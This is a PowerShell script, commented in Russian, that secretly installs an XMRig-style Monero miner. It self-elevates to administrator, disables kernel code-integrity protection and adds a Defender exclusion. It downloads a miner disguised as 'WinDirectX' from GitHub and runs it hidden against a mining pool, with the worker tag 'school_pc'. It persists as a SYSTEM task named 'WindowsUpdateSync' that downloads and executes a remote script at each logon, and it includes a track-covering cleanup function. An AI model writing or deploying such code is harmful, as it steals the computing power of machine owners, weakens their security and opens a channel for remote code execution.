# 0. Самовозвышение до Администратора (Лифт)
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# --- КОНФИГУРАЦИЯ ---
$path = "C:\ProgramData\SystemLib"
# Твой проверенный Monero адрес из Cake Wallet
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA" 
$procName = "WinDirectX"
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"
$rawScript = "https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/refs/heads/main/win_utility.ps1"

Write-Host "--- ЗАПУСК СИСТЕМЫ (FINAL BUILD) ---" -ForegroundColor Cyan

# 1. Остановка старых процессов
Write-Host "[1/8] Очистка процессов..." -NoNewline
Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
Write-Host " Ок." -ForegroundColor Green

# 2. Разблокировка памяти (Против 15 МБ)
Write-Host "[2/8] Оптимизация защиты ядра..." -NoNewline
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
Write-Host " Готово." -ForegroundColor Yellow

# 3. Антивирус и папка
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# 4. Скачивание майнера
Write-Host "[4/8] Загрузка ядра..." -NoNewline
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -ErrorAction Stop
    Write-Host " Успешно." -ForegroundColor Green
} catch {
    Write-Host " Ошибка сети!" -ForegroundColor Red; exit
}

# 5. Создание файлов запуска (Исправленные флаги)
$cmd = "@echo off`n$path\$procName.exe --title $procName --cpu-priority 1  --cpu-no-yield  --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --algo rx/0 --donate-level 1"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 6. Автозагрузка от имени SYSTEM
Write-Host "[6/8] Скрытая служба..." -NoNewline
$taskName = "WindowsUpdateSync"
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"""
Register-ScheduledTask -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName $taskName -User "System" -RunLevel Highest -Force | Out-Null
Write-Host " Ок." -ForegroundColor Green

# 7. Функции контроля (check, update, delete)
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force | Out-Null }
$Functions = @"
function check {
    `$p = Get-Process $procName -ErrorAction SilentlyContinue
    if (`$p) { 
        Write-Host "СТАТУС: РАБОТАЕТ" -ForegroundColor Green 
        Write-Host "Память: `$([Math]::Round(`$p.WorkingSet64 / 1MB, 2)) MB" -ForegroundColor White
    } else { Write-Host "СТАТУС: ВЫКЛЮЧЕН" -ForegroundColor Red }
}
function update { 
    Write-Host "Обновление конфигурации..." -ForegroundColor Cyan
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    irm '$rawScript' | iex 
}
function delete {
    Write-Host "УДАЛЕНИЕ И ЗАМЕТАНИЕ СЛЕДОВ..." -ForegroundColor Red
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 1 -ErrorAction SilentlyContinue
    Stop-Process -Name "$procName" -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "$taskName" -Confirm:`$false -ErrorAction SilentlyContinue
    Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
    Clear-Content -Path "`$PROFILE" -ErrorAction SilentlyContinue
    Write-Host "ГОТОВО. Система чиста, защита возвращена." -ForegroundColor Green
}
"@
$Functions | Out-File -FilePath $ProfilePath -Force

# 8. Запуск
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "`n--- ВСЁ ГОТОВО! СИСТЕМА АКТИВИРОВАНА ---" -ForegroundColor Magenta
Write-Host "Команды: check, update, delete" -ForegroundColor Gray
